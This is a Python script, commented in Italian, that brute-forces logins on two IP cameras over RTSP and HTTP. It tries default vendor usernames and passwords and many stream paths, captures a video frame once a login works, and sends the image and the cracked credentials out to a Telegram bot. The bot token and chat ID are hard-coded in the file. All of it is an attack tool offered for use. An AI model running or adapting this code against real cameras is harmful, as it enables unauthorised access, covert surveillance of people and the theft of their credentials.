#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔓 IP Camera RTSP Brute Force
Prova combinazioni estese di user:password sulle cam RTSP della rete.
"""
import sys, io, os, time, json, socket, urllib.request, urllib.parse
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

TOKEN   = "8215784991:AAE-78OdQk3pZZVSY22CfqnXBlyZjT-q1dA"
CHAT_ID = "715100445"
SNAP_DIR = "scratch/cam_snaps"
os.makedirs(SNAP_DIR, exist_ok=True)

# ── Target cameras ────────────────────────────────────────────────────────────
TARGETS = [
    ("192.168.1.53", 554),
    ("192.168.1.54", 554),
]

# ── Extended credential list (real IP cam defaults) ───────────────────────────
USERNAMES = [
    "admin", "Admin", "ADMIN",
    "root", "Root",
    "user", "User",
    "guest", "Guest",
    "operator", "viewer",
    "service", "support",
    "supervisor",
    "666666", "888888",
    "hikvision", "dahua",
]

PASSWORDS = [
    # Blank / trivial
    "", "0", "1",
    # Numeric sequences
    "1234", "12345", "123456", "1234567", "12345678",
    "00000", "000000", "0000", "111111", "123123",
    # Common words
    "admin", "Admin", "ADMIN",
    "password", "Password", "pass",
    "root", "toor",
    "guest", "user",
    "test", "camera", "cam",
    "ipcam", "ipcamera", "ip1234",
    # Hikvision defaults
    "hik12345", "Hik12345", "Hik123456",
    "hikadmin", "HikAdmin",
    # Dahua defaults
    "admin123", "Admin123",
    "dahua", "Dahua",
    # TP-Link / Tapo
    "tplink", "tapo", "Tapo123",
    # Reolink
    "reolink", "Reolink",
    # Generic
    "12345admin", "admin12345",
    "abcdef", "abc123",
    "qwerty", "qwerty123",
    "letmein", "welcome",
    "security", "secure",
    "monitor", "camera1",
    "ipcam1", "cam1234",
    "888888", "666666",
    "support", "service",
    "system", "System",
    "video", "Video",
    "stream", "live",
    "passw0rd", "p@ssword",
    "Pass1234", "Admin1234",
]

# RTSP paths to try for each credential
RTSP_PATHS = [
    "",
    "/stream1",
    "/stream",
    "/live/ch00_0",
    "/h264Preview_01_main",
    "/Streaming/Channels/1",
    "/ch0_0.264",
    "/live",
    "/cam/realmonitor?channel=1&subtype=0",
    "/video1",
    "/live/main",
]

# ── Telegram helpers ──────────────────────────────────────────────────────────
def send_msg(text):
    data = json.dumps({"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}).encode("utf-8")
    req  = urllib.request.Request(
        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
        data=data, headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read().decode()).get("ok", False)
    except Exception:
        return False

def send_photo(path, caption=""):
    if not os.path.exists(path):
        return False
    boundary = "----Boundary7MA4YWxk"
    with open(path, "rb") as f:
        photo_data = f.read()
    parts = [
        f"--{boundary}".encode(),
        b'Content-Disposition: form-data; name="chat_id"', b"", CHAT_ID.encode(),
        f"--{boundary}".encode(),
        b'Content-Disposition: form-data; name="caption"', b"", caption.encode("utf-8"),
        f"--{boundary}".encode(),
        b'Content-Disposition: form-data; name="photo"; filename="snap.jpg"',
        b"Content-Type: image/jpeg", b"", photo_data,
        f"--{boundary}--".encode(),
    ]
    body = b"\r\n".join(parts)
    req  = urllib.request.Request(
        f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
        data=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
            "User-Agent": "Mozilla/5.0"
        }
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read().decode()).get("ok", False)
    except Exception as e:
        print(f"send_photo error: {e}")
        return False

# ── RTSP snapshot attempt ─────────────────────────────────────────────────────
def try_rtsp(ip, port, user, pwd, path, timeout_ms=3000):
    if not HAS_CV2:
        return None
    try:
        # Build RTSP URL — pass credentials raw (no URL encoding) so ffmpeg handles auth
        if user or pwd:
            # Escape only @ in password to avoid URL ambiguity
            safe_pwd = pwd.replace("@", "%40")
            safe_user = user.replace("@", "%40")
            auth = f"{safe_user}:{safe_pwd}@"
        else:
            auth = ""
        url = f"rtsp://{auth}{ip}:{port}{path}"
        # MUST force CAP_FFMPEG — default backend misinterprets RTSP as image sequence
        cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
        cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, timeout_ms)
        cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, timeout_ms)
        if cap.isOpened():
            time.sleep(0.5)
            ret, frame = cap.read()
            cap.release()
            if ret and frame is not None:
                out = os.path.join(SNAP_DIR, f"{ip.replace('.','_')}_{user}_{port}.jpg")
                cv2.imwrite(out, frame)
                return out, url
        cap.release()
    except Exception as e:
        pass  # Suppress OpenCV stderr noise
    return None

# ── HTTP snapshot attempt ─────────────────────────────────────────────────────
HTTP_PATHS = [
    "/snapshot.jpg", "/snap.jpg", "/image.jpg",
    "/cgi-bin/snapshot.cgi",
    "/ISAPI/Streaming/Channels/101/picture",
    "/Streaming/Channels/1/picture",
    "/tmpfs/snap.jpg",
]

def try_http(ip, port, user, pwd):
    for path in HTTP_PATHS:
        try:
            if user or pwd:
                auth = f"{urllib.parse.quote(user, safe='')}:{urllib.parse.quote(pwd, safe='')}@"
                url  = f"http://{auth}{ip}:{port}{path}"
            else:
                url = f"http://{ip}:{port}{path}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=4) as r:
                ct = r.headers.get("Content-Type", "")
                if "image" in ct or "jpeg" in ct:
                    data = r.read()
                    if len(data) > 2000:
                        out = os.path.join(SNAP_DIR, f"{ip.replace('.','_')}_http.jpg")
                        with open(out, "wb") as f:
                            f.write(data)
                        return out, url
        except Exception:
            pass
    return None

# ── Brute force a single target ───────────────────────────────────────────────
def brute_target(ip, port):
    print(f"\n[BF] Inizio brute force su {ip}:{port}")
    total = len(USERNAMES) * len(PASSWORDS)
    print(f"[BF] Combinazioni totali: {total} x {len(RTSP_PATHS)} path RTSP")

    attempt = 0
    for user in USERNAMES:
        for pwd in PASSWORDS:
            attempt += 1
            # Progress ogni 50 tentativi
            if attempt % 50 == 0:
                pct = round(attempt / total * 100, 1)
                print(f"  [{pct}%] Tentativo {attempt}/{total} - {user}:{pwd}")

            # Try RTSP paths
            for path in RTSP_PATHS:
                result = try_rtsp(ip, port, user, pwd, path)
                if result:
                    snap_path, url = result
                    print(f"\n  [SUCCESS] RTSP: {url}")
                    return snap_path, user, pwd, url

            # Try HTTP on port 80 if this is port 554 target
            if port == 554:
                result = try_http(ip, 80, user, pwd)
                if result:
                    snap_path, url = result
                    print(f"\n  [SUCCESS] HTTP: {url}")
                    return snap_path, user, pwd, url

    return None

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    total_combos = len(USERNAMES) * len(PASSWORDS)
    send_msg(
        f"\U0001f513 <b>Brute force telecamere avviato</b>\n\n"
        f"Target: <code>192.168.1.53</code> e <code>192.168.1.54</code>\n"
        f"Combinazioni: <b>{total_combos}</b> user:password\n"
        f"Percorsi RTSP: <b>{len(RTSP_PATHS)}</b>\n\n"
        f"Stima tempo: 3-8 minuti. Ti avviso appena trovo accesso \U0001f50d"
    )

    for ip, port in TARGETS:
        send_msg(f"\U0001f50d Brute force su <code>{ip}:{port}</code>...")
        result = brute_target(ip, port)

        if result:
            snap_path, user, pwd, url = result
            caption = (
                f"\U0001f4f8 <b>Accesso ottenuto!</b>\n"
                f"\U0001f5a5 IP: <code>{ip}</code>\n"
                f"\U0001f511 Credenziali: <code>{user}:{pwd}</code>\n"
                f"\U0001f4e1 URL: <code>{url}</code>"
            )
            send_photo(snap_path, caption)
            send_msg(
                f"\u2705 <b>Telecamera {ip} sbloccata!</b>\n"
                f"User: <code>{user}</code> | Pass: <code>{pwd}</code>"
            )
        else:
            send_msg(
                f"\U0001f6ab <b>{ip}:{port}</b> \u2014 Nessuna combinazione ha funzionato.\n"
                f"La password potrebbe essere personalizzata e non in dizionario."
            )

    send_msg("\U0001f3c1 <b>Brute force completato</b> su tutti i target.")

if __name__ == "__main__":
    main()
